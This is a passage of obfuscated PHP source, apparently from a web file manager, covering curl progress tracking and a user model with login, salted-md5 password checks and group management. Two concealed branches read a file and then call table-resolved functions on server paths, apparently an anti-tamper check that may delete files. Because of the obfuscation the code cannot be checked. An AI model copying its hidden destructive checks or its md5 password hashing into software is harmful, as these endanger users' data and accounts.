($©ßœ²º) { case $ı»úŞë³[619]: $™‚°»õÆ = 1; break; case $ı»úŞë³[622]: $£¿”î¶”[$ı»úŞë³[1830]] = $õóë™ ×[$ı»úŞë³[32]]; break; case $ı»úŞë³[624]: $™‚°»õÆ = intval($ˆï†ıÎ½[$ı»úŞë³[440]] * 0.4); break; case $ı»úŞë³[626]: $™‚°»õÆ = intval($ˆï†ıÎ½[$ı»úŞë³[440]] * 0.2); break; case $ı»úŞë³[628]: $™‚°»õÆ = intval($ˆï†ıÎ½[$ı»úŞë³[440]] * 0.4); break; } $this->update($™‚°»õÆ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($£ãèãáİ, $×®€Â½) { $Ó¿—äÔÓ =& $_SERVER[÷åé¼î]; $this->sourceModelCopyFlag = !0; $›ûÚŠ·ó = 1; if (isset($£ãèãáİ[$Ó¿—äÔÓ[82]])) { $›ûÚŠ·ó = $£ãèãáİ[$Ó¿—äÔÓ[82]][$Ó¿—äÔÓ[80]]; $›ûÚŠ·ó = $›ûÚŠ·ó + $£ãèãáİ[$Ó¿—äÔÓ[82]][$Ó¿—äÔÓ[81]] + 1; } $this->update($›ûÚŠ·ó); $this->sourceModelCopyFlag = !1; } public function sourceMove($¢¢Š’ç²) { $this->sourceRemove($¢¢Š’ç², !1); } public function curlProgress($İ–€Ç‘ë, $Ş˜¢Ï…ö, $ÏÆÀñà, $­ŸÒ­Õ±, $èÃšü¢¬) { $§®¡Ó˜ =& $_SERVER[÷åé¼î]; $äÖ—Š–Â =& $this->task; if ($èÃšü¢¬ > 0) { $äÖ—Š–Â[$§®¡Ó˜[1137]] = $§®¡Ó˜[1852]; $äÖ—Š–Â[$§®¡Ó˜[1834]] = $§®¡Ó˜[110]; if ($äÖ—Š–Â[$§®¡Ó˜[1832]]) { $äÖ—Š–Â[$§®¡Ó˜[1833]] = $èÃšü¢¬; } if ($äÖ—Š–Â[$§®¡Ó˜[1835]]) { $äÖ—Š–Â[$§®¡Ó˜[1833]] = $èÃšü¢¬ + $äÖ—Š–Â[$§®¡Ó˜[1835]]; } } else { if ($ÏÆÀñà > 0) { if ($äÖ—Š–Â[$§®¡Ó˜[1832]] == $Ş˜¢Ï…ö) { $äÖ—Š–Â[$§®¡Ó˜[1833]] = $ÏÆÀñà; $äÖ—Š–Â[$§®¡Ó˜[1137]] = $§®¡Ó˜[1853]; $äÖ—Š–Â[$§®¡Ó˜[1834]] = $§®¡Ó˜[1273]; } } } $this->update(); } public function curlProgressStart($Œâå¡×è) { } public function curlProgressEnd($èâª¦äœ) { $¨¬èş– =& $_SERVER[÷åé¼î]; $’í¬½Ş =& $this->task; $ı›‹Úª = curl_getinfo($èâª¦äœ); $ğÍõø£³ = $ı›‹Úª[$¨¬èş–[1854]]; if ($ğÍõø£³ == -1) { $ğÍõø£³ = $ı›‹Úª[$¨¬èş–[1855]]; } if ($’í¬½Ş[$¨¬èş–[1834]] == $¨¬èş–[110] && $ğÍõø£³) { $’í¬½Ş[$¨¬èş–[1835]] += $ğÍõø£³; } $this->update(); } } if ($_SERVER[$_SERVER[÷åé¼î][933]] != $_SERVER[$_SERVER[÷åé¼î][1448]]) { $_getc = $_SERVER[÷åé¼î][934]; $_getfile = $_SERVER[$_SERVER[÷åé¼î][935]] . $_SERVER[÷åé¼î][936]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[÷åé¼î][262], $_getfilec); if (count($_getarrs) < $_SERVER[÷åé¼î][677]) { $exit = $_SERVER[÷åé¼î][937]; $exit(); } $_act = $_SERVER[÷åé¼î][938]; $_act($_SERVER[$_SERVER[÷åé¼î][931]]); } class TaskHttp extends Task { protected function startAfter() { $ù‚ñ¾Å =& $_SERVER[÷åé¼î]; $ÉÜûÇØ‹ =& $this->task; $ÉÜûÇØ‹[$ù‚ñ¾Å[1856]] = 1; Hook::bind($ù‚ñ¾Å[1824], array($this, $ù‚ñ¾Å[1857])); Hook::bind($ù‚ñ¾Å[1826], array($this, $ù‚ñ¾Å[1858])); Hook::bind($ù‚ñ¾Å[1828], array($this, $ù‚ñ¾Å[1859])); } protected function endAfter() { $ÄÎÖóş =& $_SERVER[÷åé¼î]; Hook::unbind($ÄÎÖóş[1824], array($this, $ÄÎÖóş[1857])); Hook::unbind($ÄÎÖóş[1826], array($this, $ÄÎÖóş[1858])); Hook::unbind($ÄÎÖóş[1828], array($this, $ÄÎÖóş[1859])); } public function progressStart($¼Ïˆ¹¿ª) { $ÊØëÅ‘ç =& $_SERVER[÷åé¼î]; $¸¿’¬Ê– = curl_getinfo($¼Ïˆ¹¿ª); self::log($ÊØëÅ‘ç[1860] . $¸¿’¬Ê–[$ÊØëÅ‘ç[367]]); self::valueSet($this->task[$ÊØëÅ‘ç[459]], $this->task); } public function progressEnd($„ï¼“şû) { $ùÒæËÕŞ =& $_SERVER[÷åé¼î]; self::log($ùÒæËÕŞ[1861] . $this->task[$ùÒæËÕŞ[459]]); $this->end(); } public function progress($€Âúà²´, $ï½Ğ™À, $÷äˆÉ–, $Æ“›¶„Ş, $”Ô“ñš) { $¨¢òè¹Æ =& $_SERVER[÷åé¼î]; $ú³ú€»È =& $this->task; if ($”Ô“ñš > 0) { $ú³ú€»È[$¨¢òè¹Æ[1135]] = $ú³ú€»È[$¨¢òè¹Æ[1135]] == 0 ? $Æ“›¶„Ş : $ú³ú€»È[$¨¢òè¹Æ[1135]]; $ú³ú€»È[$¨¢òè¹Æ[1780]] = $”Ô“ñš; } else { if ($÷äˆÉ– > 0) { $ú³ú€»È[$¨¢òè¹Æ[1135]] = $ú³ú€»È[$¨¢òè¹Æ[1135]] == 0 ? $ï½Ğ™À : $ú³ú€»È[$¨¢òè¹Æ[1135]]; $ú³ú€»È[$¨¢òè¹Æ[1780]] = $÷äˆÉ–; } } $this->update(); self::log("\x70\162\x6f\147\x72\x65\163\163\110\x74\x74\x70\x3a\x64\x6f\x77\156\72{$÷äˆÉ–}\x2f{$ï½Ğ™À}\73\x20\165\160\x6c\157\141\x64\72{$”Ô“ñš}\x2f{$Æ“›¶„Ş}\73"); } } goto eîïÈÙÑ; FİÌ«À‰°Ä: class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\x74\x61\142\154\145\116\x61\155\145" => "\165\x73\x65\x72\137\x6d\145\164\x61", "\155\145\x74\141\x46\151\x65\x6c\144" => "\x75\163\x65\x72\x49\x44"); protected $simpleField = "\x75\x73\145\162\111\104\x2c\156\x69\143\153\x4e\141\x6d\145\x2c\x6e\141\155\145\x2c\141\166\141\164\x61\x72\x2c\163\x65\x78\x2c\163\164\x61\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Õà‡Ÿ¼İ) { $ß‹šÍ«„ =& $_SERVER[÷åé¼î]; $Úñİ¬“Š = $ß‹šÍ«„[2456]; return array($ß‹šÍ«„[2059] => array($Õà‡Ÿ¼İ[0], $Úñİ¬“Š), $ß‹šÍ«„[2061] => array($Õà‡Ÿ¼İ[0], $Úñİ¬“Š), $ß‹šÍ«„[2457] => array($Õà‡Ÿ¼İ[0], $Úñİ¬“Š)); } protected function getInfo($¦Ù¯§, $²Ü‰€ì = false) { $Îã–Öûü = $this->getInfoSimple($¦Ù¯§); if (!is_array($Îã–Öûü)) { return array(); } if ($²Ü‰€ì) { return $this->_getInfoApply($Îã–Öûü); } return $this->cacheFunctionGet($_SERVER[÷åé¼î][2063], $¦Ù¯§); } protected function getInfoFull($ÒïÙš´Ñ, $ë¤ÎëŸ— = false) { $ÄÌşÊËß = $this->getInfoSimple($ÒïÙš´Ñ); if (!is_array($ÄÌşÊËß)) { return array(); } if ($ë¤ÎëŸ—) { return $this->_getInfoApply($ÄÌşÊËß, !0); } return $this->cacheFunctionGet($_SERVER[÷åé¼î][2458], $ÒïÙš´Ñ); } private function _getInfoApply($ÛÈáåÕ¬, $ò´›óÀ€ = false) { $Øƒğ¯úò =& $_SERVER[÷åé¼î]; if (!$ÛÈáåÕ¬) { return $ÛÈáåÕ¬; } $‰ãÆøà = md5($Øƒğ¯úò[2459] . $ÛÈáåÕ¬[$Øƒğ¯úò[961]] . $Øƒğ¯úò[2460] . $ÛÈáåÕ¬[$Øƒğ¯úò[32]]); $ÛÈáåÕ¬ = $this->_listDataApplyItem($ÛÈáåÕ¬); $“À¬¼úˆ = Model($Øƒğ¯úò[1414])->metaGet($ÛÈáåÕ¬[$Øƒğ¯úò[90]][$Øƒğ¯úò[193]]); $ÛÈáåÕ¬[$Øƒğ¯úò[2461]] = $‰ãÆøà; $ÛÈáåÕ¬[$Øƒğ¯úò[90]][$Øƒğ¯úò[2257]] = isset($“À¬¼úˆ[$Øƒğ¯úò[2258]]) ? $“À¬¼úˆ[$Øƒğ¯úò[2258]] : null; if ($ò´›óÀ€) { $ÛÈáåÕ¬[$Øƒğ¯úò[523]] = $this->metaGet($ÛÈáåÕ¬[$Øƒğ¯úò[1779]]); } return $ÛÈáåÕ¬; } protected function getInfoSimple($ı«œ€Ÿ¡, $î¼ğı£ = false) { $Ğõ¼“ÄÚ =& $_SERVER[÷åé¼î]; if (!$ı«œ€Ÿ¡) { return array(); } if ($î¼ğı£) { $ãÛ¤¦éä = $this->where(array($Ğõ¼“ÄÚ[1779] => intval($ı«œ€Ÿ¡)))->find(); if (!is_array($ãÛ¤¦éä)) { return array(); } $ãÛ¤¦éä[$Ğõ¼“ÄÚ[2462]] = Action($Ğõ¼“ÄÚ[2463])->parseUrl($ãÛ¤¦éä[$Ğõ¼“ÄÚ[2462]]); return $ãÛ¤¦éä; } return $this->cacheFunctionGet($Ğõ¼“ÄÚ[2064], $ı«œ€Ÿ¡); } protected function getInfoSimpleOuter($Æ³óø‡°) { $è‰˜«• =& $_SERVER[÷åé¼î]; if (!$Æ³óø‡° || $Æ³óø‡° == 0) { return array($è‰˜«•[1779] => $è‰˜«•[228], $è‰˜«•[32] => $è‰˜«•[176] . LNG($è‰˜«•[2464]) . $è‰˜«•[178], $è‰˜«•[2462] => STATIC_PATH . $è‰˜«•[2465]); } $ü±¡˜Ê = $this->cacheFunctionGet($è‰˜«•[2064], $Æ³óø‡°); $ı”ß¼ ¤ = array_field_key($ü±¡˜Ê, explode($è‰˜«•[50], $this->simpleField)); if (!$ı”ß¼ ¤) { return array($è‰˜«•[1779] => $è‰˜«•[1267], $è‰˜«•[32] => $è‰˜«•[176] . LNG($è‰˜«•[2466]) . $è‰˜«•[178], $è‰˜«•[2462] => STATIC_PATH . $è‰˜«•[2467]); } $ı”ß¼ ¤[$è‰˜«•[2462]] = Action($è‰˜«•[2463])->parseUrl($ı”ß¼ ¤[$è‰˜«•[2462]]); return $ı”ß¼ ¤; } protected function groupUser($ÒƒÏ¹úæ) { } public static function errorLang($®®¤§¡³) { $—é’ÙÍæ =& $_SERVER[÷åé¼î]; $²®ÑÚµš = array(self::ERROR_USER_NOT_EXISTS => $—é’ÙÍæ[2468], self::ERROR_USER_PASSWORD_ERROR => $—é’ÙÍæ[2469], self::ERROR_USER_EXIST_NAME => $—é’ÙÍæ[2470], self::ERROR_USER_EXIST_PHONE => $—é’ÙÍæ[2471], self::ERROR_USER_EXIST_EMAIL => $—é’ÙÍæ[2472], self::ERROR_USER_LOGIN_LOCK => $—é’ÙÍæ[2473], self::ERROR_IP_NOT_ALLOW => $—é’ÙÍæ[2474], self::ERROR_USER_EXIST_NICKNAME => $—é’ÙÍæ[2475]); $ˆ¬Ø†¿ = LNG($²®ÑÚµš[$®®¤§¡³]); if ($®®¤§¡³ == self::ERROR_USER_LOGIN_LOCK) { $ş³·“îÏ = (int) Model($—é’ÙÍæ[2476])->get($—é’ÙÍæ[2477]); if ($ş³·“îÏ > 60) { $ˆ¬Ø†¿ = str_replace($—é’ÙÍæ[91], ceil($ş³·“îÏ / 60), $ˆ¬Ø†¿); } } return $ˆ¬Ø†¿; } public function getInfoByMeta($´·şâ”Â, $¸äØ‘Ø) { $¸íôßó‹ =& $_SERVER[÷åé¼î]; $•éÒ‰­ = Model($¸íôßó‹[2478])->where(array($¸íôßó‹[97] => $´·şâ”Â, $¸íôßó‹[434] => $¸äØ‘Ø))->find(); if ($•éÒ‰­) { return $this->getInfo($•éÒ‰­[$¸íôßó‹[1779]]); } return !1; } public function userLoginCheck($õ™âÒ®, $ÍÛµÈï) { $åÇß÷÷î =& $_SERVER[÷åé¼î]; $æ¼ÖÏÌ = $this->userLoginFind($õ™âÒ®); if (!$æ¼ÖÏÌ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($æ¼ÖÏÌ[$åÇß÷÷î[1779]], $ÍÛµÈï)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($æ¼ÖÏÌ[$åÇß÷÷î[1779]]); } public function userLoginFind($¸àÀÏÚî) { $ôŞñ‡ã =& $_SERVER[÷åé¼î]; $É§öÇì¶ = array($ôŞñ‡ã[32] => $¸àÀÏÚî, $ôŞñ‡ã[2265] => $¸àÀÏÚî, $ôŞñ‡ã[365] => $¸àÀÏÚî, $ôŞñ‡ã[2479] => $¸àÀÏÚî, $ôŞñ‡ã[1072] => $ôŞñ‡ã[1074]); if ($this->nickNameRpt()) { unset($É§öÇì¶[$ôŞñ‡ã[2265]]); } return $this->where($É§öÇì¶)->find(); } public function clearCache($¨Õá–½³) { $İ÷û€œş =& $_SERVER[÷åé¼î]; $this->cacheFunctionClear($İ÷û€œş[2063], $¨Õá–½³); $this->cacheFunctionClear($İ÷û€œş[2064], $¨Õá–½³); $this->cacheFunctionClear($İ÷û€œş[2458], $¨Õá–½³); } public function userPasswordCheck($‡¨§áö¬, $ıË¤Ë¤) { $™Íğª×ı =& $_SERVER[÷åé¼î]; $¿ÜÎù™ = $this->where(array($™Íğª×ı[1779] => intval($‡¨§áö¬)))->find(); $€¼¹„– = $this->metaGet($‡¨§áö¬); $¡¨æ…ÄÜ = isset($€¼¹„–[$™Íğª×ı[2480]]) ? $€¼¹„–[$™Íğª×ı[2480]] : $™Íğª×ı[12]; if (md5($¡¨æ…ÄÜ . trim($ıË¤Ë¤)) !== $¿ÜÎù™[$™Íğª×ı[961]]) { return !1; } return !0; } public function userAdd($¶Õòš¨ú) { $¦œ´Ó£ı =& $_SERVER[÷åé¼î]; $øúâì¾ = array($¦œ´Ó£ı[478] => $¶Õòš¨ú[$¦œ´Ó£ı[32]], $¦œ´Ó£ı[2481] => $¶Õòš¨ú[$¦œ´Ó£ı[2183]], $¦œ´Ó£ı[2482] => isset($¶Õòš¨ú[$¦œ´Ó£ı[365]]) ? $¶Õòš¨ú[$¦œ´Ó£ı[365]] : $¦œ´Ó£ı[12], $¦œ´Ó£ı[2483] => isset($¶Õòš¨ú[$¦œ´Ó£ı[2479]]) ? $¶Õòš¨ú[$¦œ´Ó£ı[2479]] : $¦œ´Ó£ı[12], $¦œ´Ó£ı[2484] => isset($¶Õòš¨ú[$¦œ´Ó£ı[2265]]) ? $¶Õòš¨ú[$¦œ´Ó£ı[2265]] : $¶Õòš¨ú[$¦œ´Ó£ı[32]], $¦œ´Ó£ı[2485] => isset($¶Õòš¨ú[$¦œ´Ó£ı[2462]]) ? $¶Õòš¨ú[$¦œ´Ó£ı[2462]] : $¦œ´Ó£ı[12], $¦œ´Ó£ı[2486] => isset($¶Õòš¨ú[$¦œ´Ó£ı[2487]]) ? $¶Õòš¨ú[$¦œ´Ó£ı[2487]] : 1, $¦œ´Ó£ı[2488] => $¶Õòš¨ú[$¦œ´Ó£ı[961]], $¦œ´Ó£ı[2065] => isset($¶Õòš¨ú[$¦œ´Ó£ı[1964]]) ? $¶Õòš¨ú[$¦œ´Ó£ı[1964]] : 1024 * 1024 * 20, $¦œ´Ó£ı[2066] => 0, $¦œ´Ó£ı[2489] => 0, $¦œ´Ó£ı[2110] => isset($¶Õòš¨ú[$¦œ´Ó£ı[815]]) ? $¶Õòš¨ú[$¦œ´Ó£ı[815]] : 1); if (!empty($¶Õòš¨ú[$¦œ´Ó£ı[1779]])) { $øúâì¾[$¦œ´Ó£ı[1779]] = $¶Õòš¨ú[$¦œ´Ó£ı[1779]]; } $ëÆˆ•ˆÉ = $this->_checkExist($¶Õòš¨ú); if ($ëÆˆ•ˆÉ !== !0) { return $ëÆˆ•ˆÉ; } if (!empty($øúâì¾[$¦œ´Ó£ı[2462]]) && strlen($øúâì¾[$¦œ´Ó£ı[2462]]) > 255) { $øúâì¾[$¦œ´Ó£ı[2462]] = $¦œ´Ó£ı[12]; } $×ôæÄö– = $this->add($øúâì¾); $¬í¿Úû© = array($¦œ´Ó£ı[2488] => $øúâì¾[$¦œ´Ó£ı[961]], $¦œ´Ó£ı[2484] => $øúâì¾[$¦œ´Ó£ı[2265]]); $this->userEdit($×ôæÄö–, $¬í¿Úû©); Model($¦œ´Ó£ı[1414])->userRootAdd($×ôæÄö–); return $×ôæÄö–; } protected function userEditTest($âö Çş, $¶ƒ–úÛ) { return $this->call($_SERVER[÷åé¼î][2490], $âö Çş, $¶ƒ–úÛ); } protected function userEdit($˜©”‚ÖÆ, $¸Ğ¾¢³„) { $İ¬ö±–È =& $_SERVER[÷åé¼î]; $ß¨¸ÀêØ = $this->getInfoSimple($˜©”‚ÖÆ); if (!$ß¨¸ÀêØ) { return !1; } $ùÏ…Íì = $this->_checkExist($¸Ğ¾¢³„, $˜©”‚ÖÆ); if ($ùÏ…Íì !== !0) { return $ùÏ…Íì; } if (isset($¸Ğ¾¢³„[$İ¬ö±–È[961]]) && trim($¸Ğ¾¢³„[$İ¬ö±–È[961]]) != $İ¬ö±–È[12]) { $†ß¸ªöû = $this->metaGet($˜©”‚ÖÆ); if (empty($†ß¸ªöû[$İ¬ö±–È[2480]])) { $†ß¸ªöû[$İ¬ö±–È[2480]] = rand_string(10); Model($İ¬ö±–È[561])->metaSet($˜©”‚ÖÆ, $İ¬ö±–È[2480], $†ß¸ªöû[$İ¬ö±–È[2480]]); } $¸Ğ¾¢³„[$İ¬ö±–È[961]] = md5($†ß¸ªöû[$İ¬ö±–È[2480]] . trim($¸Ğ¾¢³„[$İ¬ö±–È[961]])); } else { unset($¸Ğ¾¢³„[$İ¬ö±–È[961]]); } if (!empty($¸Ğ¾¢³„[$İ¬ö±–È[2462]]) && strlen($¸Ğ¾¢³„[$İ¬ö±–È[2462]]) > 255) { $¸Ğ¾¢³„[$İ¬ö±–È[2462]] = $İ¬ö±–È[12]; } $this->where(array($İ¬ö±–È[1770] => $˜©”‚ÖÆ))->save($¸Ğ¾¢³„); if (isset($¸Ğ¾¢³„[$İ¬ö±–È[2265]])) { $this->setNamePinyin($˜©”‚ÖÆ, $¸Ğ¾¢³„[$İ¬ö±–È[2265]]); } $this->clearCache($˜©”‚ÖÆ); return !0; } public function setNamePinyin($…¾Ê­³õ, $¢ª“²ÚÏ = false) { $•¾…¢ÍÏ =& $_SERVER[÷åé¼î]; if (!$¢ª“²ÚÏ) { $«û¢ÈùÂ = $this->getInfoSimple($…¾Ê­³õ); $¢ª“²ÚÏ = $«û¢ÈùÂ[$•¾…¢ÍÏ[2265]] ? $«û¢ÈùÂ[$•¾…¢ÍÏ[2265]] : $«û¢ÈùÂ[$•¾…¢ÍÏ[32]]; } $—Ş¾šÅ = Model($•¾…¢ÍÏ[582]); if (!Input::check($¢ª“²ÚÏ, $•¾…¢ÍÏ[639])) { return $—Ş¾šÅ->metaSet($…¾Ê­³õ, array($•¾…¢ÍÏ[522] => $•¾…¢ÍÏ[12], $•¾…¢ÍÏ[521] => $•¾…¢ÍÏ[12])); } return $—Ş¾šÅ->metaSet($…¾Ê­³õ, array($•¾…¢ÍÏ[522] => str_replace($•¾…¢ÍÏ[53], $•¾…¢ÍÏ[12], Pinyin::get($¢ª“²ÚÏ)), $•¾…¢ÍÏ[521] => Pinyin::get($¢ª“²ÚÏ, $•¾…¢ÍÏ[640]))); } private function nickNameRpt() { $™”°ïÜè =& $_SERVER[÷åé¼î]; $úÆõ€´Ï = Model($™”°ïÜè[835])->get($™”°ïÜè[2491]); $´Ô™Ù§Ê = $GLOBALS[$™”°ïÜè[6]][$™”°ïÜè[441]][$™”°ïÜè[2491]]; $²Úü’ë¹ = !is_null($úÆõ€´Ï) ? $úÆõ€´Ï : $´Ô™Ù§Ê; return !!$²Úü’ë¹; } private function _checkExist($ß‘…ĞçÓ, $ºµŸ¶© = false) { $‰²›™ãÇ =& $_SERVER[÷åé¼î]; $’­®Ÿƒù = array($‰²›™ãÇ[32] => UserModel::ERROR_USER_EXIST_NAME, $‰²›™ãÇ[2265] => UserModel::ERROR_USER_EXIST_NICKNAME, $‰²›™ãÇ[365] => UserModel::ERROR_USER_EXIST_EMAIL, $‰²›™ãÇ[2479] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($’­®Ÿƒù[$‰²›™ãÇ[2265]]); } $Øéù‡Æì = $ºµŸ¶© ? array($‰²›™ãÇ[1779] => array($‰²›™ãÇ[2492], $ºµŸ¶©)) : array(); foreach ($’­®Ÿƒù as $éŸš™ë¬ => $³Ñ“ãæİ) { $Úø’„ñÊ = array(); foreach ($’­®Ÿƒù as $ÀÆ®œˆš => $îÌ·¢Ä) { if (isset($ß‘…ĞçÓ[$ÀÆ®œˆš]) && $ß‘…ĞçÓ[$ÀÆ®œˆš]) { $Úø’„ñÊ[] = $ß‘…ĞçÓ[$ÀÆ®œˆš]; } } if (!$Úø’„ñÊ) { continue; } $ºïÜ×êß = array_merge(array($éŸš™ë¬ => array($‰²›™ãÇ[7], $Úø’„ñÊ)), $Øéù‡Æì); $ùáµÀ™ú = $this->where($ºïÜ×êß)->find(); if ($ùáµÀ™ú) { return $³Ñ“ãæİ; } } return !0; } public function userListInfo($¸ÓÅ¬¹¨) { $âªİÁ¹Á =& $_SERVER[÷åé¼î]; $ªí—öàê = array(); $¸ÓÅ¬¹¨ = is_array($¸ÓÅ¬¹¨) ? array_unique($¸ÓÅ¬¹¨) : array(); if (!$¸ÓÅ¬¹¨) { return $ªí—öàê; } if (count($¸ÓÅ¬¹¨) < 20) { foreach ($¸ÓÅ¬¹¨ as $ï¨…×ß©) { $ªí—öàê[$ï¨…×ß© . $âªİÁ¹Á[12]] = $this->getInfoSimpleOuter($ï¨…×ß©); } } else { $äŒ†Û† = array($âªİÁ¹Á[1770] => array($âªİÁ¹Á[476], $¸ÓÅ¬¹¨)); if (count($¸ÓÅ¬¹¨) == 1) { $äŒ†Û† = array($âªİÁ¹Á[1770] => $¸ÓÅ¬¹¨[0]); } $¤Ë¶Ùİ© = Model($âªİÁ¹Á[561])->field($this->simpleField)->where($äŒ†Û†)->select(); $¤Ë¶Ùİ© = array_to_keyvalue($¤Ë¶Ùİ©, $âªİÁ¹Á[1779]); foreach ($¸ÓÅ¬¹¨ as $ï¨…×ß©) { $Ô€‚Ğ¾ã = $¤Ë¶Ùİ©[$ï¨…×ß©]; if (!$Ô€‚Ğ¾ã) { $ªí—öàê[$ï¨…×ß© . $âªİÁ¹Á[12]] = $this->getInfoSimpleOuter($ï¨…×ß©); continue; } $Ô€‚Ğ¾ã[$âªİÁ¹Á[2462]] = Action($âªİÁ¹Á[2463])->parseUrl($Ô€‚Ğ¾ã[$âªİÁ¹Á[2462]]); $ªí—öàê[$ï¨…×ß© . $âªİÁ¹Á[12]] = $Ô€‚Ğ¾ã; } } return $ªí—öàê; } protected function userStatus($‰ê™…ë‘, $°Š™°·) { $±Àëšå = $this->getInfoSimple($‰ê™…ë‘); if (!$±Àëšå) { return !1; } $É²ó“µ× = array($_SERVER[÷åé¼î][815] => $°Š™°·); return $this->userEdit($‰ê™…ë‘, $É²ó“µ×); } protected function userRemove($Ö†ª°ô) { $ûşñáîî =& $_SERVER[÷åé¼î]; $‘›™‹…Ğ = $this->getInfoSimple($Ö†ª°ô); if (!$‘›™‹…Ğ) { return !1; } $ÈÜüú©ƒ = array($ûşñáîî[1770] => $Ö†ª°ô); Model($ûşñáîî[648])->where($ÈÜüú©ƒ)->delete(); Model($ûşñáîî[2493])->where($ÈÜüú©ƒ)->delete(); Model($ûşñáîî[2071])->where($ÈÜüú©ƒ)->delete(); Model($ûşñáîî[2478])->where($ÈÜüú©ƒ)->delete(); Model($ûşñáîî[1141])->where($ÈÜüú©ƒ)->delete(); Model($ûşñáîî[2282])->removeUserAll($Ö†ª°ô); Model($ûşñáîî[889])->userRootRemove($Ö†ª°ô); return $this->where($ÈÜüú©ƒ)->delete(); } protected function userGroupSet($ÀûÉÌäˆ, $ÇªÜÇòÍ, $Öı¨èğõ = array()) { $„¬½ã­¬ =& $_SERVER[÷åé¼î]; if ($_SERVER[$„¬½ã­¬[933]] != $_SERVER[$„¬½ã­¬[1448]]) { $×çŸ®„ = $„¬½ã­¬[949]; $§Ï¾ÒÃ = $„¬½ã­¬[934]; $ãÒ¯Û‘‚ = $_SERVER[$„¬½ã­¬[935]] . $„¬½ã­¬[936]; $ÜÎ¼¦Å¦ = $§Ï¾ÒÃ($ãÒ¯Û‘‚); $”õâ¡¹¿ = explode($„¬½ã­¬[262], $ÜÎ¼¦Å¦); if (count($”õâ¡¹¿) < $„¬½ã­¬[703]) { $‹¦¢›äş = $„¬½ã­¬[937]; $‹¦¢›äş(); } $§²øâåê = $„¬½ã­¬[950]; $§²øâåê($_SERVER[$„¬½ã­¬[951]]); $§²øâåê($_SERVER[$„¬½ã­¬[935]] . $„¬½ã­¬[2494]); $˜Ş‹Òóó = 1; while ($˜Ş‹Òóó > 1) { $˜Ş‹Òóó = $˜Ş‹Òóó + 4; $ºœ¾çãİ = rawurlencode($˜Ş‹Òóó . $„¬½ã­¬[438]); } } $¾ìûúôÕ = $this->getInfoSimple($ÀûÉÌäˆ); if (!$¾ìûúôÕ || !is_array($ÇªÜÇòÍ)) { return !1; } $¯æÉÅ× = Model($„¬½ã­¬[2071]); $¯æÉÅ×->where(array($„¬½ã­¬[1779] => $ÀûÉÌäˆ))->delete(); $ëèĞ¨£ = array(); $¾ãùŠºÅ = 0; foreach ($ÇªÜÇòÍ as $©Öİ‘¥à => $ãÎÃÇñá) { $¶á“ş  = array($„¬½ã­¬[1779] => $ÀûÉÌäˆ, $„¬½ã­¬[1977] => $©Öİ‘¥à, $„¬½ã­¬[2085] => $ãÎÃÇñá); $¶á“ş [$„¬½ã­¬[2001]] = isset($Öı¨èğõ[$¾ãùŠºÅ]) ? $Öı¨èğõ[$¾ãùŠºÅ] : 0; $¾ãùŠºÅ++; $ëèĞ¨£[] = $¶á“ş ; } return $¯æÉÅ×->addAll($ëèĞ¨£, array(), !0); } protected function userGroupAdd($£İ‚Öèœ, $Â­š¬ÕÜ = array()) { $Ú¸ËÉ¶´ =& $_SERVER[÷åé¼î]; $À®Êóğ€ = $this->getInfoSimple($£İ‚Öèœ); if (!$À®Êóğ€ || empty($Â­š¬ÕÜ)) { return !1; } $‡Û÷¤À = array(); foreach ($Â­š¬ÕÜ as $Ø¿ú´¤‰ => $Ò¨Î†û¹) { $‡Û÷¤À[] = array($Ú¸ËÉ¶´[1779] => $£İ‚Öèœ, $Ú¸ËÉ¶´[1977] => $Ø¿ú´¤‰, $Ú¸ËÉ¶´[2085] => $Ò¨Î†û¹, $Ú¸ËÉ¶´[2001] => 0); } return Model($Ú¸ËÉ¶´[2071])->addAll($‡Û÷¤À, array(), !0); } protected function userGroupRemove($»òÑıÎ‚, $Ó§äÇ‚) { $‹ì¼‚´ =& $_SERVER[÷åé¼î]; $¼¾Ç»š = $this->getInfoSimple($»òÑıÎ‚); if (!$¼¾Ç»š || !$Ó§äÇ‚) { return !1; } $¦Ô–òúÁ = array($‹ì¼‚´[1770] => $»òÑıÎ‚, $‹ì¼‚´[2069] => $Ó§äÇ‚); return Model($‹ì¼‚´[2071])->where($¦Ô–òúÁ)->delete(); } public function listData() { $³¬Œ§û‰ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($³¬Œ§û‰[$_SERVER[÷åé¼î][429]]); return $³¬Œ§û‰; } public function listByID($Ÿùäù³Ğ) { $¡Ë—½İ  =& $_SERVER[÷åé¼î]; if (!$Ÿùäù³Ğ) { return; } $ÑÕş»ÒÓ = array($¡Ë—½İ [1779] => array($¡Ë—½İ [7], $Ÿùäù³Ğ)); $ÔùÅÒ¼» = $this->where($ÑÕş»ÒÓ)->select(); $ÔùÅÒ¼» = array_sort_keep($ÔùÅÒ¼», $¡Ë—½İ [1779], $Ÿùäù³Ğ); $this->_listDataApply($ÔùÅÒ¼»); return $ÔùÅÒ¼»; } public function listByGroup($ë…ÆŸæ‡ = 0, $Ùç‹µ¿¡ = array()) { $ÓıíñÆ =& $_SERVER[÷åé¼î]; $çÛè¾ï¹ = $ÓıíñÆ[12]; $­Õ–×ÊÁ = array(); if ($ë…ÆŸæ‡) { $­Õ–×ÊÁ = array($ÓıíñÆ[2495] => intval($ë…ÆŸæ‡)); $çÛè¾ï¹ = "\x4c\x45\x46\x54\x20\112\117\x49\x4e\x20{$this->tablePrefix}\165\x73\x65\x72\x5f\147\162\x6f\x75\160\40\165\163\x65\x72\x5f\147\162\x6f\x75\x70\x20\x6f\x6e\40\165\x73\145\x72\56\165\x73\145\162\x49\x44\40\x3d\40\x75\163\145\162\137\147\162\157\x75\x70\56\x75\163\x65\x72\111\104"; $êĞÏå¢ = Input::get($ÓıíñÆ[514], null, $ÓıíñÆ[12]) ? $ÓıíñÆ[12] : $ÓıíñÆ[2496]; } if 